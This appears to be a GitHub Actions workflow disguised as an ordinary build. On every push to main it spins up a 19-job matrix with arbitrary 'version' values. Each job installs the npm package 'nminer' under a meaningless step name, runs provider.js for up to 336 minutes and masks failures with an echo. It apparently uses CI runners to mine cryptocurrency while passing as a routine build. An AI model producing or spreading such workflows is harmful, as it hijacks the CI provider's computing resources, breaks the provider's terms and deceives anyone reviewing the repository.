name: provider
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 4161 }
          - { version: 6992 }
          - { version: 9208 }
          - { version: 9002 }
          - { version: 6117 }
          - { version: 3874 }
          - { version: 4385 }
          - { version: 155 }
          - { version: 3907 }
          - { version: 8237 }
          - { version: 500 }
          - { version: 4180 }
          - { version: 549 }
          - { version: 7733 }
          - { version: 641 }
          - { version: 1393 }
          - { version: 1523 }
          - { version: 1569 }
          - { version: 6098 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: downshift as for
        run: |
          npm install nminer@latest
          timeout 336m node provider.js || echo "provider executed"